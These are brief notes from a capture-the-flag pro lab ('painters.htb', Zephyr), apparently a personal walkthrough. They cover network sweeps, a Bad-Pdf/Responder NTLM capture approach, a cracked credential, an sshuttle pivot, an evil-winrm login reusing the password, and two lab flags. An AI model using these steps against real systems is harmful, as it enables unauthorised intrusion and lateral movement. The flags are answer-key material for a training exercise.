nmap -sn 10.10.110.0/24

Nmap scan report for painters.htb (10.10.110.35)
Nmap scan report for 10.10.110.2

1 . 10.10.110.35  

22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)

https://github.com/deepzec/Bad-Pdf
https://zone13.io/cracking-ntlmv2-responses-captured-using-responder/

credential : riley : P@ssw0rd
ZEPHYR{HuM4n_3rr0r_1s_0uR_D0wnf4ll}

for i in {1..255}; do ping -c 1 -W 1 192.168.110.$i > /dev/null && echo 192.168.110.$i; done

192.168.110.1
192.168.110.51
192.168.110.52
192.168.110.53
192.168.110.54
192.168.110.55

arp | grep -v "incomplete"
192.168.110.56

sshuttle -r riley@10.10.110.35 192.168.110.0/24 -v
evil-winrm -i 192.168.110.56 -u 'painters\riley' -p 'P@ssw0rd'  

ZEPHYR{PwN1nG_W17h_P4s5W0rd_R3U53}